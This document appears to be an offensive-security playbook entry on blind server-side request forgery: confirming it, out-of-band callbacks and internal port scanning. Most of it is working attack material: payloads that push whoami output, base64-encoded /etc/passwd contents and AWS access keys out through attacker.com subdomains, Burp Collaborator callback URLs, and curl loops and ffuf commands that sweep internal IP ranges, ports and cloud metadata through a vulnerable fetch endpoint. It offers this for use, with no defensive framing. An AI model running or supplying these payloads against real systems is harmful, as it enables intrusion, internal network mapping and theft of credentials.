# SSRF — Blind Detection, Out-of-Band, Port Scanning

## When this applies

- SSRF target doesn't return the fetched response in the page (blind SSRF).
- You need to confirm SSRF and enumerate internal services.
- Goal: trigger out-of-band callback, time-based detection, or port scan via timing differences.

## Technique

Use Burp Collaborator / webhook services for OOB confirmation. Time-based: open ports respond fast, closed return immediately, filtered timeout. Wordlist-fuzz IPs and ports.

## Steps

### Direct detection

```bash
# Response analysis
1. Send: http://localhost/admin
2. Compare response to: http://example.com/admin
3. Different response = SSRF confirmed

# Error messages
"Connection refused" = Port closed
"Connection timeout" = Firewall/filtered
"200 OK" = Service accessible
"Internal Server Error" = Potential SSRF
```

### Time-based detection

```bash
# Port scan timing
Open port: Fast response
Closed port: Immediate "Connection refused"
Filtered port: Timeout (5-30 seconds)

# Use timing to map internal network
http://192.168.0.1:22/    → Fast (SSH open)
http://192.168.0.1:9999/  → Slow (timeout)
```

### Out-of-band — DNS callback

```bash
# Burp Collaborator
http://abc123xyz.burpcollaborator.net

# Alternative services
http://xyz.canarytokens.com
http://requestbin.com/xyz
http://webhook.site/xyz

# DNS exfiltration
http://$(whoami).abc123.burpcollaborator.net
http://data-here.abc123.burpcollaborator.net
```

### Out-of-band — HTTP callback

```bash
# Basic callback
http://abc123.burpcollaborator.net/ssrf-test

# With path
http://abc123.burpcollaborator.net/$(whoami)

# Webhook services
http://webhook.site/abc-def-123
http://requestbin.com/r/abc123
```

### DNS exfiltration with subdomain payload

```bash
# Whoami
http://$(whoami).attacker.com

# File content (base64)
http://$(cat /etc/passwd | base64 | cut -c1-50).attacker.com

# Current directory
http://$(pwd | tr '/' '-').attacker.com

# Environment variable
http://$AWS_ACCESS_KEY_ID.attacker.com
```

### Content-based detection

```bash
# Keywords in response
"root:x:0:0:" = /etc/passwd read
"ami-id" = AWS metadata
"ComputerName" = Windows metadata
"admin panel" = Internal admin access
"Internal Server" = Internal service

# Response length
Length change = Different endpoint accessed
Consistent length = Same default page/error
```

### Port scanning via SSRF

```bash
# Internal IP scan with curl
for i in $(seq 1 255); do curl -s "http://target.com/fetch?url=http://192.168.0.$i/" | grep -q "admin" && echo "192.168.0.$i - Admin found"; done

# Port scan
for port in 22 80 443 3306 6379 8080; do echo -n "Port $port: "; curl -s --max-time 2 "http://target.com/fetch?url=http://192.168.0.1:$port/" && echo "Open"; done

# AWS metadata quick check
for i in $(seq 1 255); do curl -s "http://target.com/fetch?url=http://169.254.169.$i/"; done | grep -i "ami\|instance"
```

### ffuf for fuzzing

```bash
# Fuzz URL parameter
ffuf -u http://target.com/fetch?url=FUZZ \
     -w ssrf-payloads.txt \
     -mc 200,500

# IP range fuzzing
ffuf -u http://target.com/fetch?url=http://192.168.0.FUZZ/ \
     -w <(seq 1 255) \
     -mc 200

# Port scanning
ffuf -u http://target.com/fetch?url=http://192.168.0.1:FUZZ/ \
     -w <(seq 1 65535) \
     -mc 200
```

### Common internal ports

```
22   - SSH
80   - HTTP
443  - HTTPS
3306 - MySQL
5432 - PostgreSQL
6379 - Redis
8080 - HTTP Alt
9200 - Elasticsearch
```

### Response indicators

```
200 OK             → Service accessible
403 Forbidden      → Service exists, auth required
404 Not Found      → Endpoint not found
500 Internal Error → Potential vulnerability
Connection timeout → Port filtered
Connection refused → Port closed
```

## Verifying success

- Burp Collaborator receives DNS / HTTP callback.
- Time differential confirms open vs closed ports.
- Wordlist sweep returns 200 / characteristic length on internal hosts.

## Common pitfalls

- The server's egress firewall may block outbound to your Collaborator — try DNS only (some egress allows DNS but not HTTP).
- Some apps strip subdomain prefixes — try `data.attacker.com` not `data-here.attacker.com`.
- Async fetchers may queue requests — wait several seconds before checking Collaborator.

## Tools

- Burp Collaborator (built-in)
- canarytokens.com, webhook.site, requestbin.com
- ffuf, SSRFmap, SSRFire
- nuclei `-t ssrf-templates/`
